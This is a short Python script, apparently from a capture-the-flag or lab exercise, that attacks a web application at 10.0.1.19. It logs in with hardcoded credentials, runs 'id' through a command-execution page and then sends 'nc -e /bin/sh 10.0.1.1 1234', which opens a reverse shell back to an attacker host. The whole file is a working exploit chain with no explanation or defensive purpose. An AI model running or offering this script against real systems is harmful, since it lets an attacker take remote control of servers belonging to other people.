import requests
import lxml.html
import lxml.etree as etree

# https://stackoverflow.com/questions/25091976/python-requests-get-cookies
session = requests.Session()

response = session.get('http://10.0.1.19/login.php')
cookies = session.cookies.get_dict()
data = {"username":"admin", "password": "happy"}

response = session.post('http://10.0.1.19/login.php', data=data, cookies=cookies)
# for cookie in r.cookies:
#     print (cookie.name, cookie.value)
# print(r.url)
cookies = session.cookies.get_dict()

response = session.post('http://10.0.1.19/login.php', data=data, cookies=cookies)
response = session.get('http://10.0.1.19/command.php', cookies=cookies)
data = {"radio":"id", "submit": "Run"}

response = session.post('http://10.0.1.19/command.php', data=data, cookies=cookies)

tree = lxml.html.fromstring(response.content)
try:
	node = tree.xpath("//pre//text()")[0]
	print(node)

except:
	print("Error")


data = {"radio":"nc -e /bin/sh 10.0.1.1 1234", "submit": "Run"}

response = session.post('http://10.0.1.19/command.php', data=data, cookies=cookies)
